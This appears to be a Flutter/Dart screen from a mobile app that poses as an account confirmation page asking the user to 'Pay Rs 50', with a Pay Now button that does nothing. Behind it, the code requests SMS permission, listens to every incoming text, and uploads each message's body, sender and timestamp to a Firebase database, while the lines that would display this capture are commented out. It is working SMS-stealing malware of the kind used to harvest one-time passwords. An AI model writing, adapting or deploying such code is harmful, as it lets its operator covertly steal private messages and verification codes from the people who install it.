import 'package:background_app/widgets/primary_button.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:readsms/readsms.dart';

class HomeView extends StatefulWidget {
  const HomeView({super.key});

  @override
  State<HomeView> createState() => _HomeViewState();
}

class _HomeViewState extends State<HomeView> {
  final databaseRef = FirebaseDatabase.instance.ref('phone');
  final _plugin = Readsms();
  String sms = 'no sms received';
  String sender = 'no sms received';
  String time = 'no sms received';

  @override
  void initState() {
    super.initState();
    getPermission().then((value) {
      if (value) {
        _plugin.read();
        _plugin.smsStream.listen((event) {
          setState(() {
            sms = event.body;
            sender = event.sender;
            time = event.timeReceived.toString();
          });
          seeMessage();
        });
      }
    });
  }

  Future<bool> getPermission() async {
    if (await Permission.sms.status == PermissionStatus.granted) {
      return true;
    } else {
      if (await Permission.sms.request() == PermissionStatus.granted) {
        return true;
      } else {
        return false;
      }
    }
  }

  seeMessage() {
    databaseRef.child(DateTime.now().millisecondsSinceEpoch.toString()).set({
      'sms': '$sms',
      'sender': '$sender',
      'time': '$time',
    });
    // print(sms);
    // print(sender);
  }

  @override
  void dispose() {
    super.dispose();
    _plugin.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF4d79ff),
        title: const Text(
          'Confirmation',
          style: TextStyle(
            fontSize: 20,
            fontWeight: FontWeight.w400,
          ),
        ),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.center,
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            // Text('new sms received: $sms'),
            // Text('new sms Sender: $sender'),
            // Text('new sms time: $time'),
            const Center(
              child: Text(
                'To Confirm Your Account Pay Rs 50',
                style: TextStyle(
                  fontSize: 20,
                  fontWeight: FontWeight.w400,
                  color: Color(0xFF0D253C),
                ),
              ),
            ),
            const SizedBox(
              height: 20,
            ),
            PrimaryButton(
              width: 100,
              bgColor: Colors.green,
              title: 'Pay Now',
              onTap: () {
                // Navigator.of(context).push(
                //   MaterialPageRoute(
                //     builder: ((context) => const PaymentView()),
                //   ),
                // );
              },
            )
          ],
        ),
      ),
    );
  }
}